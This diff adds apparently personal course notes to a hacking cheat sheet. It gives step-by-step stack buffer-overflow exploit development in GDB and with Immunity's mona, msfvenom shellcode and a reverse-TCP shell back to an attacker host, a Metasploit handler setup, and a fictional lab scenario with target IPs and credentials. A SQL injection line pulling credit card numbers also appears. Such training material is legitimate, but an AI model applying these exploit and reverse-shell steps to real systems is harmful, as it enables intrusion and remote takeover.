@@ -158,8 +158,163 @@ GET METHOD
 ' union select id,creditcard_number,order from sqlinjection.payments
 
 
+------------------------------------------------------------------------------------------- GDB (LINUX) -----------------------------------------------------------------------------------------------------
+disass <function> dissasemble portion of the program
+info <> supply info for specific stack areas
+x/256c $<REGISTER> read characters from specific register
+break <address> establish a break point
 
 
+gdb <./executable>
+	get executable into debugger
+
+run <<<$(echo "hello")
+	redirects hello into script
+
+pdisass main
+	disassembles main function
+
+find next function
+pdisass it
+	pdisass <hex next to function name>
+find function thats red (has vulerability)
+
+run <<<$(python buffer.py)
+wiremask.eu
+
+paste long thing into script, run script
+	EIP value into registervalue on wiremask.eu to get offset (buffer size)
+
+change script to found offset value
+add eip variable set to 4 new characters ("BBBB")
+run it
+
+back out of gdb
+run this
+	env - gdb ./func
+show env
+	unset all of them
+unset env COLUMNS
+unset env LINES
+run
+put in a string thats way too long
+	segmentation fault
+
+info proc map
+	gets map
+make note of first address after heap
+make note of last address of stack
+
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4			0xff is jmp 0xe4 is esp
+ (first after heap) (last of stack)
+
+grab 4 of the addresses and paste them in script, comment them out
+break them down into their individual bytes
+flip them around
+	#0xf7de2b59 = 0xf7 de 2b 59 = \x59\x2b\xde\xf7
+copy paste conversion into eip variable
+
+run this in new terminal
+	msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+copy paste shell code into python script
+	everything that starts with buf
+create nop variable
+	nop = "\x90" * 15
+add nop + buf to print statement
+
+quit out of gdb
+./func <<<$(python buffer.py)
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Gorgas Exploit Development (GED)
+XX Mar 2023
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: DEVOPS
+
+Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.
+
+Tools/Techniques: Exploit binaries on target systems using the tools below.
+
+    Python
+    OllyDBG or an equivelent graphical program
+        http://www.ollydbg.de/
+    GNU Debugger's(GDB) Python Exploit Development Assistance Module
+        https://github.com/longld/peda
+    MetaSploit
+        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
+
+Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty
+
+Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.28.105
+
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245
+
+Target Section:
+
+T1
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+
+T2
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: unknown
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+
+T3
+Hostname: unknown
+IP: 192.168.150.245
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Exploit a network service on the machine
+
+---------------------------------------------------------------------WINDOWS EXPLOITATION---------------------------------------------------------------------------------------------------------------------
+mostly same as linux steps
+
+!mona modules into white box - finds exploitable dll's
+	go to table to find dll you want
+!mona jmp -r esp -m "essfunc.dll" into white bar
+	replace .dll with whatever one is vulnerable
+window dropdown 2. log data
+shows esp locations
+take the hex values and do the whole little endian thing again
+	take little endian conversion and replace the 4 B's with it
+create payload using msfvenom again
+	msfvenom -p windows/shell/reverse_tcp lhost=10.50.38.49 lport=8888 -b "\x00" -f python
+	lhost is your linux opstation
+copy everything other than buf = "" line
+paste payload in python script
+msfconsole
+use multi/handler
+show options
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport <port you made in msfvenom>
+run multi/handler
+run winbuffer.py
 
 
 
